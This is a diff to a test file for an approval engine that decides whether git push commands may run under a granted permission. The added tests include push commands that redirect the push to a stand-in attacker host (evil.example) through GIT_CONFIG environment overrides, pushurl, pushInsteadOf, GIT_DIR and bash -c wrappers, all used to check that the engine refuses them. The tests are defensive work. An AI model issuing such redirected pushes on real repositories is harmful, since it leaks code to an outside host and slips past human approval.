@@ -29,15 +29,17 @@ const SHA = '270d83f1c2c5572d4eec1d66819c64168ecd7a61';
 const SHA2 = '16932d7397ef17ba0c8db6b236a37fc46eb53f6b';
 const URL = 'git@github.com:o/r.git';
 const PUSH = `git push origin ${SHA}:refs/heads/feat/x`;
-/** Remote names resolve per directory; `evil` points somewhere else. */
-const resolver = (dir, remote) => (remote === 'origin' ? URL : remote === 'evil' ? 'git@evil.example:o/r.git' : null);
+/** Remote names resolve per directory; `evil` points somewhere else. No push risks. */
+const resolver = {
+  pushUrl: (dir, remote) => (remote === 'origin' ? URL : remote === 'evil' ? 'git@evil.example:o/r.git' : null),
+  pushRisk: () => null,
+};
 
 // --- What can be granted ---------------------------------------------------------
 
 test('the one approvable form canonicalises to its exact target', () => {
   for (const command of [
     PUSH, `git push -u origin ${SHA}:refs/heads/feat/x`, `git -C /r push origin ${SHA}:refs/heads/feat/x`,
-    `bash -c "git push origin ${SHA}:refs/heads/feat/x"`,
   ]) {
     const c = canonicalAction(command, '/r', resolver);
     assert.ok(c.ok, `${command}: ${c.why}`);
@@ -55,11 +57,45 @@ test('everything broader cannot be granted, with a reason', () => {
     `git push origin ${SHA}:refs/heads/a ${SHA}:refs/heads/b`, `git push origin +${SHA}:refs/heads/x`,
     `git push origin ${SHA}:refs/heads/a..b`, 'git push origin $SHA:refs/heads/x', `git push nowhere ${SHA}:refs/heads/x`,
     `git -c alias.p=push p origin ${SHA}:refs/heads/x`, 'gh pr merge 12', `git push`,
+    // Anything in front of git can change where the push goes (Dwight, HAG-49 H1).
+    `bash -c "git push origin ${SHA}:refs/heads/feat/x"`,
+    `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil.example/x.git ${PUSH}`,
+    `env GIT_DIR=/tmp/other/.git ${PUSH}`, `/usr/bin/${PUSH}`,
   ]) {
     const c = canonicalAction(command, '/r', resolver);
     assert.equal(c.ok, false, command);
     assert.ok(c.why.length > 10, command);
   }
+});
+
+// --- Where the push really goes (real git) ---------------------------------------
+
+const { execFileSync } = require('node:child_process');
+function repo(t, ...config) {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-git-'));
+  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
+  execFileSync('git', ['init', '-q', dir]);
+  execFileSync('git', ['-C', dir, 'remote', 'add', 'origin', 'https://github.com/good/repo.git']);
+  for (const [k, v] of config) execFileSync('git', ['-C', dir, 'config', k, v]);
+  return dir;
+}
+
+test('the target is the PUSH url, so pushurl and pushInsteadOf cannot redirect an approved push', (t) => {
+  const plain = canonicalAction(PUSH, repo(t));
+  assert.equal(plain.action.target.remote_url, 'https://github.com/good/repo.git');
+  const viaPushurl = canonicalAction(PUSH, repo(t, ['remote.origin.pushurl', 'https://evil.example/x.git']));
+  assert.equal(viaPushurl.action.target.remote_url, 'https://evil.example/x.git');
+  const viaInsteadOf = canonicalAction(PUSH, repo(t, ['url.https://evil.example/.pushInsteadOf', 'https://github.com/']));
+  assert.equal(viaInsteadOf.action.target.remote_url, 'https://evil.example/good/repo.git');
+});
+
+test('a repo that would publish more than the approved ref cannot be granted', (t) => {
+  for (const [k, v] of [['push.followTags', 'true'], ['push.recurseSubmodules', 'on-demand']]) {
+    const c = canonicalAction(PUSH, repo(t, [k, v]));
+    assert.equal(c.ok, false, k);
+    assert.match(c.why, /more than the approved ref/);
+  }
+  assert.ok(canonicalAction(PUSH, repo(t, ['push.recurseSubmodules', 'check'])).ok, 'check only verifies');
 });
 
 // --- The store ----------------------------------------------------------------------
@@ -158,6 +194,22 @@ test('live: no grant asks; a grant allows exactly that push, logged with its id'
   assert.equal(e.evaluate(pre(`git push evil ${SHA}:refs/heads/feat/x`)).decision, 'ask', 'a re-pointed remote');
   assert.equal(e.evaluate(pre(`git push --force origin ${SHA}:refs/heads/feat/x`)).decision, 'ask');
   assert.equal(e.evaluate(pre(`git commit --amend --no-edit && ${PUSH}`)).decision, 'ask', 'amend-and-push in one call');
+});
+
+test('live: a grant for the good URL is not used when the repo pushes elsewhere', (t) => {
+  const dir = repo(t);
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'md-grant-engine-'));
+  fs.mkdirSync(path.join(root, 'policy'));
+  fs.writeFileSync(path.join(root, 'policy', 'engine.json'), JSON.stringify({ version: 1, rules: [PUSH_RULE] }));
+  const e = new PolicyEngine(root, () => {});
+  e.load();
+  const grants = new GrantStore(path.join(root, 'policy', 'grants.jsonl'));
+  grants.mint(request('jim', { class: 'git-push', target: { remote_url: 'https://github.com/good/repo.git', ref: 'refs/heads/feat/x', sha: SHA }, summary: '' }));
+  execFileSync('git', ['-C', dir, 'config', 'remote.origin.pushurl', 'https://evil.example/x.git']);
+  assert.equal(e.evaluate(pre(PUSH, 'jim', dir)).decision, 'ask', 'pushurl');
+  execFileSync('git', ['-C', dir, 'config', '--unset', 'remote.origin.pushurl']);
+  assert.equal(e.evaluate(pre(`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil.example/x.git ${PUSH}`, 'jim', dir)).decision, 'ask', 'env prefix');
+  assert.equal(e.evaluate(pre(PUSH, 'jim', dir)).decision, 'allow', 'the approved push itself still goes');
 });
 
 test('dry_run notes the grant and does not use it', () => {
